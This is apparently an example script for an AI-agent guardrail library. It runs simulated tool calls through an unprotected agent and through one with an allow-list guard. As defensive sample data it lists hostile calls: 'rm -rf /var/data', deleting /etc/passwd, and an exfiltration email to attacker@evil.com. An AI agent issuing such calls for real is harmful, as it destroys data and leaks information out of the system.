"""
Example 05 — Agent Tool Call Protection
=========================================
Simulates an AI agent that calls tools. Parry intercepts dangerous
tool calls before they execute.
Run: python examples/05_tool_call_protection.py
"""

from parry import Guard
from parry.exceptions import GuardException

# ── Simulated tool registry ────────────────────────────────────────────────
def search_web(query: str) -> str:
    return f"Search results for: {query}"

def read_file(path: str) -> str:
    return f"Contents of {path}"

def exec_shell(command: str) -> str:
    # This would actually run the command — dangerous!
    return f"Executed: {command}"

def delete_file(path: str) -> str:
    return f"Deleted: {path}"

def send_email(to: str, body: str) -> str:
    return f"Email sent to {to}"

TOOL_REGISTRY = {
    "search_web": search_web,
    "read_file": read_file,
    "exec_shell": exec_shell,
    "delete_file": delete_file,
    "send_email": send_email,
}

# ── Simulated agent tool calls ─────────────────────────────────────────────
TOOL_CALLS = [
    # (tool_name, args, description)
    ("search_web", {"query": "latest AI research papers"}, "Safe search"),
    ("read_file", {"path": "report.pdf"}, "Safe file read"),
    ("exec_shell", {"command": "ls -la"}, "Shell exec (dangerous)"),
    ("exec_shell", {"command": "rm -rf /var/data"}, "Destructive shell exec"),
    ("delete_file", {"path": "/etc/passwd"}, "Delete sensitive system file"),
    ("send_email", {"to": "attacker@evil.com", "body": "leaked data"}, "Exfiltration via email"),
]


def unprotected_agent(tool_name: str, args: dict) -> str:
    """Agent with no guardrails — executes any tool call."""
    fn = TOOL_REGISTRY.get(tool_name)
    if fn:
        return fn(**args)
    return f"Unknown tool: {tool_name}"


def protected_agent(guard: Guard, tool_name: str, args: dict) -> str:
    """Agent protected with Parry — validates tool calls first."""
    report = guard.scan_tool_call(tool_name, args)

    if report.blocked:
        raise GuardException(
            reason=report.decision.reason,
            threats=report.threats,
        )

    fn = TOOL_REGISTRY.get(tool_name)
    if fn:
        return fn(**args)
    return f"Unknown tool: {tool_name}"


if __name__ == "__main__":
    # Only allow safe tools explicitly
    guard = Guard(
        mode="block",
        agents={"allowed_tools": ["search_web", "read_file"]},
    )

    print("=" * 60)
    print("AGENT TOOL CALL PROTECTION")
    print("=" * 60)
    print(f"\nAllowed tools: search_web, read_file\n")

    for tool_name, args, description in TOOL_CALLS:
        print(f"Tool: {tool_name}({args})  [{description}]")

        # Unprotected
        result = unprotected_agent(tool_name, args)
        print(f"  ❌ Unprotected: {result}")

        # Protected
        try:
            result = protected_agent(guard, tool_name, args)
            print(f"  ✅ Parry:       ALLOWED → {result}")
        except GuardException as e:
            report = guard.scan_tool_call(tool_name, args)
            t = report.threats[0] if report.threats else None
            severity = t.severity if t else "N/A"
            desc = t.description if t else e.reason
            print(f"  🚫 Parry:       BLOCKED | {severity} | {desc}")
        print()
